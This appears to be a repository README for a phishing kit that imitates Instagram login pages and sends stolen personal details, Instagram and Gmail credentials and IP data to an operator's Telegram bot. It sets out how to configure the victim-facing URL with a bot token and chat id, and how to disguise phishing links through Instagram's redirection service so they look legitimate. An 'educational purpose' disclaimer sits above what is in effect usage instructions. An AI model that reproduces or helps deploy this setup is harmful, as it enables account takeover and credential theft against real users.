# 🚨 Instagram Phishing Telegram Bot  

🔥 **My Social Engineering & Phishing Project: How Attackers Exploit Social Engineering**  

Only For Educational Purpose ♥️

---

## 📌 What I Built  

To demonstrate **real-world attack scenarios**, I created a **phishing page** that integrates with the **Telegram API** to capture and send:  

✅ **Personal details**  
✅ **Instagram logins**  
✅ **Gmail logins**  
✅ **IP lookup information**  

This project helps in understanding how phishing attacks work and how attackers leverage **social engineering techniques**.

## 🛠️ How It Works  

Url Format Before Sending to Victim : 
www.example.com/?bt=123456:ABCDEF&id=987654321

bt = your telegram bot token
id = your telegram chat id

### 🔹 **Dynamic Functionality**  
- The **bot token** in the URL determines where the captured data is sent.  
- This makes it **adaptable** to different attack scenarios and real-time monitoring via Telegram.  

### 🔹 **Advanced URL Masking**  
- To **increase deception**, I experimented with **Instagram’s official redirection service**.  
- This allows masking a phishing URL to make it appear more **legitimate**.

## 🎯 **Demo: URL Masking in Action**  

For example, this **Instagram redirection** link appears safe but actually redirects users to **Amazon**:

📌 **This technique enhances deception, making it harder for users to detect phishing attempts.**
